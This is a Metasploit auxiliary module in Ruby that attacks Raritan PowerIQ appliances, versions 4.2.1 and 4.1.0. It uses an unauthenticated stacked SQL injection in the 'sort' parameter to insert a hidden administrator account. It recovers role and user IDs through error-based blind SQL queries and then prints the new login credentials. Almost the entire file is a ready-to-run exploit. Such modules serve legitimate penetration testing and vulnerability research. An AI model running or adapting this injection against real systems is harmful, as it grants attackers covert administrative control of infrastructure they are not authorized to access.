##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'digest/sha1'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Raritan PowerIQ Unauthenticated Hidden Administrator Credential Addition',
      'Description'    => %q{
      This module attempts to add a hidden admin in vulnerable Raritan PowerIQ instances.

      This module exploits an unauthenticated stacked SQL injection to add a administrator user to
      Raritan PowerIQ versions 4.2.1 and 4.1.0 (and possibly previous versions)
      },
      'References'     =>
        [
          ['URL', 'http://seclists.org/fulldisclosure/2014/Jul/79']
        ],
      'Author'         =>
        [
          'bperry',
        ],
      'License'        => 'VolatileMinds',
      'DisclosureDate' => "Jul 16 2014"
    ))

    register_options(
      [
        Opt::RPORT(443),
        OptBool.new('SSL', [true, 'Use SSL', true]),
        OptString.new('TARGETURI', [true, 'The path to Raritan PowerIQ', '/']),
      ], self.class)
  end

  def run
    username = Rex::Text.rand_text_alpha(10)
    password = Rex::Text.rand_text_alpha(10)
    salt = Rex::Text.rand_text_alpha(20)

    send_injected_request(get_user_insert(username, salt, password))

    id = get_user_id(username)

    send_injected_request(get_users_roles_insert(id))

    authed = authenticate(username, password)

    if authed
      print_good("Please log in with #{username}:#{password}")
    else
      print_status("Authentication not successful. Injections likely failed")
    end
  end

  def authenticate(username, password)
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'login', 'login'),
      'method' => 'POST',
      'vars_post' => {
        'login' => username,
        'password' => password
      }
    })

    return res.code == 302
  end

  def send_injected_request(sql)
    post = {
      "sort" => "id#{sql}",
      "dir" => "ASC"
    }

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'license', 'records'),
      'method' => 'POST',
      'vars_post' => post,
      'headers' => {
        'X-Requested-With' => 'XMLHttpRequest'
      }
    })

    return res
  end

  def get_user_insert(username, salt, passwd)
    str = ";insert into users "
    str << "(created_at, crypted_password, description, email, firstname, hidden, lastname, ldap_dn, login, salt, type, updated_at) "
    str << "values ('#{Time.now}', '#{make_password(salt, passwd)}', '', '', '', true, '', '', '#{username}', '#{salt}', '', '#{Time.now}');--"

    return str
  end

  def get_users_roles_insert(user_id)
    str = ';insert into roles_users (user_id, role_id) '
    str << "values (#{user_id}, '#{get_role_id('site_administrator')}');"
    str << 'insert into roles_users (user_id, role_id) '
    str << "values (#{user_id}, '#{get_role_id('registered')}');--"

    return str
  end

  def get_role_id(role)
    length = 0
    1.upto(9) do |l|
      str = ",(SELECT (CASE WHEN (ASCII(SUBSTRING((SELECT COALESCE(CAST(id AS CHARACTER(10000)),(CHR(32))) FROM roles where name='#{role}' OFFSET 0 LIMIT 1)::text FROM #{l} FOR 1))>1) THEN 1 ELSE 1/(SELECT 0) END))"
      res = send_injected_request(str)

      if res.code == 200
        length = length + 1
      else
        break
      end
    end

    id = ''
    1.upto(length) do |o|
      48.upto(58) do |i|
        str = ",(SELECT (CASE WHEN (ASCII(SUBSTRING((SELECT COALESCE(CAST(id AS CHARACTER(10000)),(CHR(32))) FROM roles WHERE name='#{role}' OFFSET 0 LIMIT 1)::text FROM #{o} FOR 1))>#{i}) THEN 1 ELSE 1/(SELECT 0) END))"
        res = send_injected_request(str)

        if res.code == 500
          id  << i.chr
          break
        end
      end
    end

    return id.to_i
  end

  def get_user_id(username)
    str = ",(SELECT (CASE WHEN (ASCII(SUBSTRING((SELECT COALESCE(CAST(COUNT(id) AS CHARACTER(10000)),(CHR(32))) FROM users WHERE login='#{username}')::text FROM 1 FOR 1))>48) THEN 1 ELSE 1/(SELECT 0) END))"

    res = send_injected_request(str)

    unless res.code == 200
      fail_with("User creation failed.")
    end

    length = 0
    1.upto(9) do |l|
      str = ",(SELECT (CASE WHEN (ASCII(SUBSTRING((SELECT COALESCE(CAST(id AS CHARACTER(10000)),(CHR(32))) FROM users where login='#{username}' OFFSET 0 LIMIT 1)::text FROM #{l} FOR 1))>1) THEN 1 ELSE 1/(SELECT 0) END))"
      res = send_injected_request(str)

      if res.code == 200
        length = length + 1
      else
        break
      end
    end

    id = ''
    1.upto(length) do |o|
      48.upto(58) do |i|
        str = ",(SELECT (CASE WHEN (ASCII(SUBSTRING((SELECT COALESCE(CAST(id AS CHARACTER(10000)),(CHR(32))) FROM users WHERE login='#{username}' OFFSET 0 LIMIT 1)::text FROM #{o} FOR 1))>#{i}) THEN 1 ELSE 1/(SELECT 0) END))"

        res = send_injected_request(str)

        if res.code == 500
          id << i.chr
          break
        end
      end
    end

    return id.to_i
  end

  def make_password(salt, password)
    return Digest::SHA1.hexdigest("--#{salt}--#{password}--")
  end
end

